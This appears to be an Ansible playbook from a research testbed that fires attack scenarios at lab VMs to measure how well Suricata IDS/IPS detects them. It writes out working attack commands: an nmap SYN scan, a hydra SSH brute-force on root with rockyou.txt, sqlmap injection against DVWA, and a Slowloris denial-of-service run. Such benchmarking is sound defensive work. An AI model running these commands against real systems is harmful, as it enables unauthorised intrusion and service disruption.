# =============================================================================
# ARCHIVIRT - Suricata 6.0.4 IDS/IPS Test Scenario Playbook
# =============================================================================
# Author  : Yasnemanegre SAWADOGO (SPbGUPTD)
# License : MIT — https://github.com/yasnemanegre/ARCHIVIRT
# Version : 2.4.0 — 2026-05-19
#
# Description:
#   Runs a single attack scenario against Suricata 6.0.4 in IDS or IPS mode.
#   Called by run_all_scenarios.yml for each of SCN-001 to SCN-005.
#
# KEY OPTIMIZATION: Suricata is NOT restarted between scenarios if already
#   running. Rule loading takes ~80s on 2 vCPU — restarting 5 times = 400s
#   wasted. Instead, Suricata stays alive and logs are rotated per scenario.
#
# Variables (passed via -e):
#   scenario    : scenario ID, e.g. "SCN-001"  (default: SCN-001)
#   ids_prefix  : IDS identifier prefix        (default: suricata)
#   ids_mode    : "ids" or "ips"               (default: ids)
#
# Usage (standalone):
#   ansible-playbook suricata_scenario.yml -i ansible/inventory/hosts.ini \
#     -e "scenario=SCN-001 ids_prefix=suricata ids_mode=ids"
# =============================================================================


# -----------------------------------------------------------------------------
# PLAY 1 — Configure OVS traffic mirroring on localhost
# -----------------------------------------------------------------------------

- name: ARCHIVIRT - Setup OVS traffic mirrors
  hosts: localhost
  connection: local
  gather_facts: no
  tasks:

    - name: Resolve scenario and ids_prefix defaults
      set_fact:
        scn:    "{{ scenario   | default('SCN-001') }}"
        pfx:    "{{ ids_prefix | default('suricata') }}"
        mode:   "{{ ids_mode   | default('ids') }}"

    - name: Run archivirt_mirrors.sh (OVS port mirror)
      shell: bash /home/archivirt/ARCHIVIRT/scripts/archivirt_mirrors.sh
      become: yes
      ignore_errors: yes
      register: mirrors

    - name: Show mirrors status
      debug:
        msg: "Mirrors: {{ mirrors.stdout_lines | default([]) | select('search', '✅') | list }}"


# -----------------------------------------------------------------------------
# PLAY 2 — Deploy and start Suricata 6.0.4 on the monitor VM
# -----------------------------------------------------------------------------

- name: ARCHIVIRT - Start Suricata on monitor (reuse if running)
  hosts: monitor
  become: yes
  tasks:

    - name: Resolve scenario and ids_prefix defaults
      set_fact:
        scn:             "{{ scenario   | default('SCN-001') }}"
        pfx:             "{{ ids_prefix | default('suricata') }}"
        mode:            "{{ ids_mode   | default('ids') }}"
        suricata_script: /opt/archivirt/scripts/run_suricata.sh

    - name: Deploy run_suricata.sh
      copy:
        src:  /home/archivirt/ARCHIVIRT/scripts/run_suricata.sh
        dest: "{{ suricata_script }}"
        mode: "0755"

    - name: Deploy Suricata configuration
      copy:
        src:  /home/archivirt/ARCHIVIRT/configs/suricata/suricata.yaml
        dest: /etc/suricata/suricata.yaml

    - name: Re-apply OVS mirrors before Suricata start
      shell: bash /home/archivirt/ARCHIVIRT/scripts/archivirt_mirrors.sh
      delegate_to: localhost
      ignore_errors: yes

    - name: Check if Suricata is already running
      shell: "pgrep -f 'suricata.*pcap\\|suricata.*ens4' || echo 'not_running'"
      register: suricata_running
      changed_when: false

    - name: Stop any previous Suricata instance (first run only)
      shell: "bash {{ suricata_script }} stop {{ scn }}"
      ignore_errors: yes
      when: suricata_running.stdout == 'not_running'

    - name: "Start Suricata — scenario={{ scn }} mode={{ mode }} (first run only)"
      shell: "bash {{ suricata_script }} start {{ scn }} {{ mode }}"
      when: suricata_running.stdout == 'not_running'

    - name: Wait for Suricata to be ready (first run only)
      wait_for:
        path:         "/var/log/suricata/{{ scn }}/suricata_stdout.log"
        search_regex: "engine started"
        timeout:      300
        delay:        5
      when: suricata_running.stdout == 'not_running'

    - name: Rotate Suricata logs for new scenario (subsequent runs)
      shell: |
        mkdir -p /var/log/suricata/{{ scn }}
        truncate -s 0 /var/log/suricata/{{ scn }}/fast.log 2>/dev/null || true
        truncate -s 0 /var/log/suricata/{{ scn }}/eve.json 2>/dev/null || true
        kill -USR2 $(pgrep -f suricata) 2>/dev/null || true
      when: suricata_running.stdout != 'not_running'
      ignore_errors: yes

    - name: Confirm Suricata is capturing
      debug:
        msg: "Suricata ready — scenario={{ scn }} mode={{ mode }} (reused={{ suricata_running.stdout != 'not_running' }})"


# -----------------------------------------------------------------------------
# PLAY 3 — Execute the attack scenario on the attacker VM
# -----------------------------------------------------------------------------

- name: ARCHIVIRT - Run attack scenario
  hosts: attacker
  become: yes
  tasks:

    - name: Resolve scenario and ids_prefix defaults
      set_fact:
        scn:  "{{ scenario   | default('SCN-001') }}"
        pfx:  "{{ ids_prefix | default('suricata') }}"
        mode: "{{ ids_mode   | default('ids') }}"

    # -- SCN-001 : Port Scan --------------------------------------------------
    - name: "SCN-001 Port Scan (nmap SYN, ports 1-1024, 10 iterations)"
      shell: |
        > /tmp/{{ pfx }}_attack_start_times_SCN-001.txt
        for i in $(seq 1 10); do
          date -u +%s.%N >> /tmp/{{ pfx }}_attack_start_times_SCN-001.txt
          nmap -sS -Pn -p 1-1024 --min-rate 1000 -T4 \
            10.0.2.11 10.0.2.12 10.0.2.13 -oN /dev/null 2>/dev/null
          sleep 5
        done
      when: scn == "SCN-001"

    # -- SCN-002 : SSH Brute-force --------------------------------------------
    - name: "SCN-002 SSH Brute-force (hydra, 10 iterations)"
      shell: |
        > /tmp/{{ pfx }}_attack_start_times_SCN-002.txt
        for i in $(seq 1 10); do
          date -u +%s.%N >> /tmp/{{ pfx }}_attack_start_times_SCN-002.txt
          hydra -l root -P /usr/share/wordlists/rockyou.txt \
            -t 4 -f ssh://10.0.2.12 2>/dev/null || true
          sleep 5
        done
      when: scn == "SCN-002"

    # -- SCN-003 : SQL Injection (DVWA) ---------------------------------------
    - name: "SCN-003 SQL Injection — get DVWA session cookie"
      shell: |
        curl -s -c - 'http://10.0.2.11/dvwa/login.php' \
          --data 'username=admin&password=password&Login=Login' \
          | grep PHPSESSID | awk '{print $NF}'
      register: dvwa_cookie
      when: scn == "SCN-003"

    - name: "SCN-003 SQL Injection — run sqlmap (10 iterations)"
      shell: |
        > /tmp/{{ pfx }}_attack_start_times_SCN-003.txt
        for i in $(seq 1 10); do
          date -u +%s.%N >> /tmp/{{ pfx }}_attack_start_times_SCN-003.txt
          sqlmap \
            -u "http://10.0.2.11/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
            --cookie="PHPSESSID={{ dvwa_cookie.stdout }};security=low" \
            --batch --level=1 --risk=1 --technique=B \
            --output-dir=/tmp/sqlmap_$i 2>/dev/null
          sleep 5
        done
      when: scn == "SCN-003"

    # -- SCN-004 : DDoS Slowloris ---------------------------------------------
    - name: "SCN-004 DDoS Slowloris (150 sockets, 15s, 10 iterations)"
      shell: |
        > /tmp/{{ pfx }}_attack_start_times_SCN-004.txt
        for i in $(seq 1 10); do
          timeout 20 python3 /opt/archivirt/attack-scripts/slowloris.py \
            10.0.2.11 --port 80 --sockets 150 --duration 15 2>/dev/null &
          SLPID=$!
          sleep 0.5
          date -u +%s.%N >> /tmp/{{ pfx }}_attack_start_times_SCN-004.txt
          wait $SLPID
          sleep 5
        done
      when: scn == "SCN-004"

    # -- SCN-005 : Normal traffic baseline (FPR reference) -------------------
    - name: "SCN-005 Normal traffic baseline (curl HTTP, 10 iterations)"
      shell: |
        > /tmp/{{ pfx }}_attack_start_times_SCN-005.txt
        for i in $(seq 1 10); do
          date -u +%s.%N >> /tmp/{{ pfx }}_attack_start_times_SCN-005.txt
          curl -s http://10.0.2.11/ > /dev/null
          curl -s http://10.0.2.12/ > /dev/null
          sleep 3
        done
      when: scn == "SCN-005"

    # -- Fetch start-time file -----------------------------------------------
    - name: Fetch attack start-time file to localhost
      fetch:
        src:  "/tmp/{{ pfx }}_attack_start_times_{{ scn }}.txt"
        dest: "/tmp/{{ pfx }}_attack_start_times_{{ scn }}.txt"
        flat: yes


# -----------------------------------------------------------------------------
# PLAY 4 — Collect results (Suricata keeps running between scenarios)
# -----------------------------------------------------------------------------

- name: ARCHIVIRT - Collect results (no Suricata stop between scenarios)
  hosts: monitor
  become: yes
  tasks:

    - name: Resolve scenario and ids_prefix defaults
      set_fact:
        scn:             "{{ scenario   | default('SCN-001') }}"
        pfx:             "{{ ids_prefix | default('suricata') }}"
        mode:            "{{ ids_mode   | default('ids') }}"
        suricata_script: /opt/archivirt/scripts/run_suricata.sh

    - name: Send SIGUSR2 to flush eve.json
      shell: "kill -USR2 $(pgrep -f suricata) 2>/dev/null || true"
      ignore_errors: yes

    - name: Wait for flush
      pause:
        seconds: 5

    - name: Count alerts from fast.log
      shell: "wc -l < /var/log/suricata/{{ scn }}/fast.log 2>/dev/null || echo 0"
      register: alert_count

    - name: Save per-scenario result to JSON
      copy:
        content: >
          {"scenario":"{{ scn }}","ids":"Suricata 6.0.4","mode":"{{ mode }}",
          "alerts":{{ alert_count.stdout | trim | default(0) }},
          "date":"{{ ansible_date_time.date }}"}
        dest: "/tmp/suricata_{{ scn }}_result.json"

    - name: Fetch per-scenario result to localhost
      fetch:
        src:  "/tmp/suricata_{{ scn }}_result.json"
        dest: "/tmp/suricata_{{ scn }}_result.json"
        flat: yes

    - name: Fetch raw eve.json
      fetch:
        src:  "/var/log/suricata/{{ scn }}/eve.json"
        dest: "/tmp/suricata_{{ scn }}_alerts.json"
        flat: yes
      ignore_errors: yes

    - name: "Show scenario result — {{ scn }} ({{ mode }})"
      debug:
        msg: "Suricata {{ scn }} [{{ mode }}]: {{ alert_count.stdout | trim }} alerts"

    - name: Stop Suricata after LAST scenario only
      shell: "bash {{ suricata_script }} stop {{ scn }}"
      when: scn == "SCN-005"
      ignore_errors: yes
